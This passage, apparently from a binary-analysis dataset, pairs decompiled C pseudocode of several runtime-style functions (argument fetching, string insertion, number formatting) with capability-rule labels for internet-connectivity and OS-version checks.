        "decompiled_code": "\nuint __fastcall fcn.00405768(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403675(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00405fec(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 440
    },
    "00405786": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405786(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004011fe(&var_ch);\n    if ((var_8h == '\\0') && (*0x57446c != 0)) {\n        pcVar3 = *0x57445c;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        uVar4 = pcVar3 - (*0x57445c + 1);\n        if (*0x57446c < uVar4) {\n            puVar5 = &var_4h;\n            var_4h = 0x682424;\n            do {\n                cVar1 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar1 != '\\0');\n            iVar6 = puVar5 - (&var_4h + 1);\n            iVar2 = fcn.00406893(*0x57445c + *0x57446c, &var_4h, iVar6);\n            if ((iVar2 != 0) && (arg_8h_00 = uVar4 + 1 + iVar6,  uVar4 <= arg_8h_00)) {\n                if (arg_8h == 0) {\n                    arg_8h = fcn.00406712(arg_8h_00);\n                    if (arg_8h != 0) goto code_r0x0048e275;\n                }\n                else if (arg_8h_00 < arg_ch) {\ncode_r0x0048e275:\n                    fcn.00405830(arg_8h, *0x57445c, *0x57446c);\n                    fcn.00405830(*0x57446c + arg_8h, &var_4h, iVar6);\n                    fcn.00405830(*0x57446c + iVar6 + arg_8h, *0x57445c + *0x57446c, (uVar4 - *0x57446c) + 1);\n                    return arg_8h;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 580
    },
    "004057b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004057b8(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0040117c(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "004057cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004057cc(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4500c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(0x5484f6);\n    for (iStack112 = 4; 0 < iStack112; iStack112 = iStack112 + -1) {\n    }\n    for (iStack116 = 0x3a; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x19; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x16291;\n}\n",
        "token_count": 293
    },
    "00405803": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405803(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    \n    if (((*in_ECX != 9) && (*arg_8h != 0)) && (piVar1 = fcn.0040528b(8),  piVar1 != NULL)) {\n        *piVar1 = *arg_8h;\n        piVar1[1] = arg_8h[1];\n        *in_ECX = *in_ECX + 1;\n        in_ECX[*in_ECX + 1] = piVar1;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "0040584e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.0040584e(uchar *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *var_44h;\n    int32_t var_40h;\n    uchar *var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004058a8(arg_1ch);\n    uVar4 = 0;\n    var_4h = *(var_10h + 0x14);\n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (*arg_8h = 0,  arg_10h == 0)) || (arg_14h == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h._0_1_ = '\\0';\n        iVar2 = fcn.00404f07(arg_10h, &var_2ch, var_4h);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040409d(arg_ch * 2);\n            if (iVar2 != 0) {\n                iVar3 = fcn.00404651(iVar2, arg_ch, var_24h, arg_14h, arg_18h, arg_1ch);\n                if (iVar3 != 0) {\n                    var_44h = arg_8h;\n                    var_3ch = arg_8h;\n                    var_40h = arg_ch;\n                    var_38h = arg_ch;\n                    var_34h = 0;\n                    var_30h._0_1_ = 0;\n                    iVar3 = fcn.004051a5(iVar2, &var_44h, var_4h);\n                    uVar4 = ~-(iVar3 != 0) & var_34h;\n                }\n            }\n            fcn.0040640b(iVar2);\n        }\n        if (var_18h != '\\0') {\n            fcn.0040640b(var_24h);\n        }\n    }\n    if (var_8h != '\\0') {\n        *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n    }\n    return uVar4;\n}\n",
        "token_count": 719
    },
    "00405862": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405862(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 364
    },
    "00405867": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405867(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t arg_10h_00;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int16_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    char *pcVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    uint uVar16;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0x8c);\n    iVar14 = *(unaff_EBP + 0x18);\n    uVar7 = *(iVar14 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.00404638(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar14, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x004704bb;\n    }\n    fcn.004032d3(*(iVar14 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00404b3d(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x94) = piVar5;\n    fcn.00405146();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x60);\n    (*pcVar2)();\n    uVar16 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x84);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.004032d3(uVar16);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00403e2c(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x578000)(0x5547ec, 0x5547fb, unaff_EBP + -0x30);\n    (*pcVar2)();\n    uVar16 = *(unaff_EBP + -0x68);\n    cVar3 = fcn.0040650f(uVar16);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        if (iVar11 == *(unaff_EBP + -0x1a)) {\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405141();\n                iVar11 = *(arg_10h_00 + 6);\n            }\n            if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x0046ff2b;\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.004027f7();\n    }\n    else {\ncode_r0x0046ff2b:\n        puVar6 = *(unaff_EBP + -0x74);\n    }\n    piVar5 = *(unaff_EBP + -0x90);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar13 = puVar6 + 1;\n    *(unaff_EBP + -0x74) = pcVar13;\n    iVar14 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x98) = ((iVar14 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar15 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar15;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar15 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar15;\n    }\n    if ((*pcVar15 == '\\x7f') || (*pcVar15 < '\\x01')) {\n        cVar3 = fcn.0040650f(uVar16);\n        if (cVar3 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                uVar7 = fcn.004064a6(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                iVar14 = *(unaff_EBP + -0x7c);\n                if (*(unaff_EBP + -0x98) == iVar14 || *(unaff_EBP + -0x98) < iVar14) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar14 != 0)) {\n                    *pcVar13 = *(uVar7 + 0x5547ec);\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x7c) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004027f7();\n                cVar3 = fcn.0040650f(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x74) = pcVar13;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x80) = 0;\n        }\n        else {\n            uVar7 = fcn.0040574f();\n            *(unaff_EBP + -0x80) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n        if (cVar3 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x34);\n            pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x004700e2:\n            do {\n                pcVar12 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar3 = *pcVar12,  *(unaff_EBP + -0x69) = cVar3,  cVar3 == '\\x7f'))\n                    goto code_r0x00470137;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) != pcVar12[iVar14]) goto code_r0x00470133;\n                    }\n                    if (iVar14 == 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) < *pcVar12) goto code_r0x00470133;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405141();\n            }\n            uVar7 = fcn.004064a6(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x7c);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x98) == iVar8 || *(unaff_EBP + -0x98) < iVar8) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar13 = *(uVar7 + 0x5547ec);\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x74) = pcVar13;\n                    *(unaff_EBP + -0x7c) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar8 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar8 + iVar14) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar8 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar8 + iVar14) = *(iVar8 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x34);\n                pcVar15 = *(unaff_EBP + -0x48);\n                pcVar12 = unaff_EBP + -0x48;\n                if (0xf < uVar7) {\n                    pcVar12 = pcVar15;\n                }\n                if ((pcVar12[iVar14] == '\\0') || (*(unaff_EBP + -0x80) == 0)) goto code_r0x004700c5;\n                iVar11 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                    iVar11 = *(arg_10h_00 + 6);\n                    uVar7 = *(unaff_EBP + -0x34);\n                    pcVar15 = *(unaff_EBP + -0x48);\n                }\n                if (iVar11 != *(unaff_EBP + -0x80)) goto code_r0x004700c5;\n                fcn.00404543(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.004027f7();\n            cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n        } while (cVar3 == '\\0');\n        uVar7 = *(unaff_EBP + -0x34);\n        pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x004700c5:\n        if (iVar14 == 0) goto code_r0x004700e2;\n        pcVar12 = unaff_EBP + -0x48;\n        if (0xf < uVar7) {\n            pcVar12 = pcVar15;\n        }\n        if ('\\0' < pcVar12[iVar14]) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x004700e2;\n        }\ncode_r0x00470133:\n        *(unaff_EBP + -99) = 1;\ncode_r0x00470137:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x78) = pcVar15;\n            *(unaff_EBP + -0x80) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.0040411a(unaff_EBP + -0x78, unaff_EBP + -0x80);\n                pcVar15 = *(unaff_EBP + -0x78);\n            }\n            fcn.00401a2d(pcVar15);\n        }\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = fcn.0040650f(0x470178);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        iVar4 = fcn.00403b8e();\n        if (iVar11 == iVar4) {\n            puVar9 = fcn.00401357();\n            puVar6 = *(unaff_EBP + -0x74);\n            *puVar6 = **puVar9;\n            pcVar13 = puVar6 + 1;\n            *(unaff_EBP + -0x74) = pcVar13;\n            fcn.004027f7();\n        }\n        else {\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x90) != 1000000000) && (*(unaff_EBP + -0x7c) == 0)) {\n        cVar3 = fcn.0040650f(uVar16);\n        if (cVar3 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x70);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.004027f7();\n                cVar3 = fcn.0040650f(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x70) = iVar14;\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < 0) {\n            *pcVar13 = '0';\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n    }\n    while (cVar3 = fcn.0040650f(uVar16),  cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        uVar7 = fcn.004064a6(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar7) break;\n        iVar14 = *(unaff_EBP + -0x7c);\n        if (iVar14 < *(unaff_EBP + -0x98)) {\n            *pcVar13 = *(uVar7 + 0x5547ec);\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x7c) = iVar14 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.004027f7();\n    }\n    pcVar15 = pcVar13;\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        while (pcVar15 = pcVar15 + -1,  pcVar15 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x90) = pcVar15;\n            ppcVar10 = fcn.00401357();\n            cVar3 = *pcVar15;\n            if (cVar3 != **ppcVar10) {\n                if (cVar3 != '9') {\n                    pcVar12 = *(unaff_EBP + -0x90);\n                    *pcVar15 = cVar3 + '\\x01';\n                    pcVar15 = pcVar12;\n                    if (pcVar12 != *(unaff_EBP + -0x88)) goto code_r0x00470353;\n                    break;\n                }\n                *pcVar15 = '0';\n            }\n        }\n        *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n        *pcVar15 = '1';\ncode_r0x00470353:\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = *(unaff_EBP + -0x61);\n    pcVar15 = pcVar13;\n    if (cVar3 != '\\0') {\n        cVar3 = fcn.0040650f(uVar16);\n        if (cVar3 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405141();\n            }\n            iVar11 = *(arg_10h_00 + 6);\n            if (iVar11 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                    iVar11 = *(arg_10h_00 + 6);\n                }\n                if (iVar11 != *(unaff_EBP + -0x18)) goto code_r0x0047049a;\n            }\n            *pcVar13 = 'e';\n            pcVar15 = pcVar13 + 1;\n            fcn.004027f7();\n            *(unaff_EBP + -0x61) = 0;\n            iVar14 = 0;\n            cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                iVar11 = *(arg_10h_00 + 6);\n                if (iVar11 == *(unaff_EBP + -0x1a)) {\n                    *pcVar15 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00405141();\n                        iVar11 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x004703fe;\n                    *pcVar15 = '-';\n                }\n                pcVar15 = pcVar13 + 2;\n                fcn.004027f7();\n            }\ncode_r0x004703fe:\n            cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                do {\n                    cVar1 = *(arg_10h_00 + 4);\n                    cVar3 = *(unaff_EBP + -0x61);\n                    *(unaff_EBP + -0x61) = cVar3;\n                    if (cVar1 == '\\0') {\n                        fcn.00405141();\n                        cVar3 = *(unaff_EBP + -0x61);\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) {\n                        if (cVar3 == '\\0') goto code_r0x0047044f;\n                        break;\n                    }\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.004027f7();\n                    cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n                } while (cVar3 == '\\0');\n                *pcVar15 = '0';\n                pcVar15 = pcVar15 + 1;\n            }\ncode_r0x0047044f:\n            do {\n                cVar3 = fcn.0040650f(*(unaff_EBP + -0x68));\n                if (cVar3 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                uVar7 = fcn.004064a6(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                if (iVar14 < 8) {\n                    *pcVar15 = *(uVar7 + 0x5547ec);\n                    pcVar15 = pcVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004027f7();\n            } while( true );\n        }\ncode_r0x0047049a:\n        cVar3 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar3 == '\\0')) {\n        pcVar15 = *(unaff_EBP + -0x84);\n    }\n    *pcVar15 = '\\0';\n    fcn.00402a0e();\ncode_r0x004704bb:\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 5570
    },
    "00405885": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405885(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar1 = *(arg_ch + 0x3c);\n    }\n    else {\n        uVar1 = *(arg_ch + 0x38);\n    }\n    uVar1 = fcn.00404e3f(uVar1);\n    *(in_ECX + 0x10) = uVar1;\n    uVar1 = 0x55494c;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar1 = *(arg_ch + 0x48);\n    }\n    uVar1 = fcn.00404e3f(uVar1);\n    *(in_ECX + 0x14) = uVar1;\n    uVar1 = 0x554950;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar1 = *(arg_ch + 0x4c);\n    }\n    uVar1 = fcn.00404e3f(uVar1);\n    *(in_ECX + 0x18) = uVar1;\n    *(in_ECX + 0xc) = **(arg_ch + 0x40);\n    *(in_ECX + 0xe) = **(arg_ch + 0x44);\n    return;\n}\n",
        "token_count": 326
    },
    "004058a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
